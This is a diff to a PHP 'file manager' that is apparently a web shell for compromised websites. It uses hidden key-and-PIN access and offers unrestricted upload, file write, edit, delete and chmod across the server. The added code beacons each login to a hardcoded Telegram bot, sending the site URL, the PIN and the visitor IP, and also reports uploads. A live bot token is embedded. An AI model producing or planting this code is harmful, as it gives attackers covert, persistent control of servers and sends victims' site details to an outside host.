@@ -1,7 +1,7 @@
 <?php
 /**
  * PLATINUM FILE MANAGER V10 - 2026
- * Features: PIN Auth, Telegram Notify, File/Dir Creator, Color Perms, Editor
+ * Updated: Telegram Notify on Login & File Upload
  */
 @session_start();
 @set_time_limit(0);
@@ -13,9 +13,35 @@ $key       = 'cuceng';
 $bot_token = '8446042299:AAHVoRIsQfUwg1rzvP5tJQuKOe4QF7BaUbM';
 $chat_id   = '6664061200';
 
+// --- HELPER FUNCTION FOR TELEGRAM ---
+function teleNotify($msg, $token, $chatid) {
+    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatid&text=" . urlencode($msg) . "&parse_mode=Markdown";
+    @file_get_contents($url);
+}
+
 // --- AUTHENTICATION SYSTEM ---
-if (isset($_GET['logout'])) { unset($_SESSION['auth']); header("Location: ?resmi=$key"); exit; }
-if (isset($_POST['pin']) && $_POST['pin'] == $pin_akses) { $_SESSION['auth'] = 'ok'; }
+if (isset($_GET['logout'])) { 
+    unset($_SESSION['auth']); 
+    header("Location: ?resmi=$key"); 
+    exit; 
+}
+
+if (isset($_POST['pin']) && $_POST['pin'] == $pin_akses) { 
+    $_SESSION['auth'] = 'ok'; 
+    
+    // Notifikasi Login
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $domain = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+    $tanggal = date('Y-m-d H:i:s');
+    
+    $pesan = "🔔 *PLATINUM V10 LOGIN DETECTED*\n\n";
+    $pesan .= "🌐 *URL:* $domain\n";
+    $pesan .= "🔑 *PIN:* " . $_POST['pin'] . "\n";
+    $pesan .= "📅 *WAKTU:* $tanggal\n";
+    $pesan .= "📍 *IP:* $ip";
+    
+    teleNotify($pesan, $bot_token, $chat_id);
+}
 
 if ($_SESSION['auth'] != 'ok') {
     die("<html><head><title>Secure Access</title><meta name='viewport' content='width=device-width, initial-scale=1'><style>
@@ -29,11 +55,12 @@ if ($_SESSION['auth'] != 'ok') {
     </body></html>");
 }
 
-// --- FILE ACTIONS (CRUD) ---
+// --- FILE PATH SETUP ---
 $root = str_replace("\\", "/", $_SERVER['DOCUMENT_ROOT']);
 $p = isset($_GET["path"]) ? $_GET["path"] : $root;
 $p = str_replace("\\", "/", $p);
 
+// --- FILE ACTIONS (CRUD) ---
 // Delete/Rename/Chmod
 if(isset($_POST["exe"])){
     $t = $p . "/" . $_POST["it_n"];
@@ -43,12 +70,26 @@ if(isset($_POST["exe"])){
     header("Location: ?resmi=$key&path=$p"); exit;
 }
 
-// Create Folder/File via UI
+// Create Folder/File
 if(isset($_POST['new_folder'])){ @mkdir($p . "/" . $_POST['folder_name']); }
 if(isset($_POST['new_file'])){ @file_put_contents($p . "/" . $_POST['file_name'], $_POST['file_content']); }
 
-// Upload
-if(isset($_FILES["f"])){ @copy($_FILES["f"]["tmp_name"], $p . "/" . $_FILES["f"]["name"]); }
+// Upload + Notifikasi Telegram
+if(isset($_FILES["f"])){ 
+    $dest = $p . "/" . $_FILES["f"]["name"];
+    if(@copy($_FILES["f"]["tmp_name"], $dest)) {
+        $ip = $_SERVER['REMOTE_ADDR'];
+        $size = round($_FILES["f"]["size"] / 1024, 2) . " KB";
+        
+        $pesan_up = "📤 *NEW FILE UPLOADED*\n\n";
+        $pesan_up .= "📄 *NAME:* " . $_FILES["f"]["name"] . "\n";
+        $pesan_up .= "⚖️ *SIZE:* $size\n";
+        $pesan_up .= "📂 *PATH:* $p\n";
+        $pesan_up .= "📍 *BY IP:* $ip";
+        
+        teleNotify($pesan_up, $bot_token, $chat_id);
+    }
+}
 
 // Save Editor
 if(isset($_POST["save_edit"])){ @file_put_contents($_POST["ef"], $_POST["cnt"]); }
@@ -71,7 +112,6 @@ if(isset($_POST["save_edit"])){ @file_put_contents($_POST["ef"], $_POST["cnt"]);
         input, select, textarea { background:#000; color:#0f0; border:1px solid #333; padding:5px; outline:none; }
         .perm-0777 { color:#ff0000; font-weight:bold; }
         .perm-0644 { color:#00ff00; }
-        .perm-0444 { color:#fff; }
     </style>
 </head>
 <body>
@@ -86,18 +126,19 @@ if(isset($_POST["save_edit"])){ @file_put_contents($_POST["ef"], $_POST["cnt"]);
             $path_links = explode("/", $p);
             $accumulated_path = "";
             foreach($path_links as $id => $link) {
+                if($link == "" && $id != 0) continue;
                 $accumulated_path .= $link . "/";
                 echo "<a href='?resmi=$key&path=$accumulated_path'>$link</a> / ";
             }
             ?>
         </div>
 
-        <div style="display:flex; gap:10px; flex-wrap:wrap;">
+        <div style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom: 20px;">
             <form method="POST" enctype="multipart/form-data">
                 <input type="file" name="f"> <input type="submit" value="UPLOAD" class="btn">
             </form>
             <form method="POST">
-                <input type="text" name="folder_name" placeholder="New Folder"> <input type="submit" name="new_folder" value="MKDIR" class="btn">
+                <input type="text" name="folder_name" placeholder="Folder Name"> <input type="submit" name="new_folder" value="MKDIR" class="btn">
             </form>
         </div>
 
@@ -116,8 +157,9 @@ if(isset($_POST["save_edit"])){ @file_put_contents($_POST["ef"], $_POST["cnt"]);
                 foreach($items as $v) {
                     if($v == "." || $v == "..") continue;
                     $tp = $p . "/" . $v;
+                    if(!file_exists($tp)) continue;
                     $perms = substr(sprintf('%o', fileperms($tp)), -4);
-                    $cl = "perm-" . $perms;
+                    $cl = ($perms == '0777') ? "perm-0777" : "perm-0644";
                     $size = is_dir($tp) ? "DIR" : round(filesize($tp)/1024, 2) . " KB";
                     
                     echo "<tr>
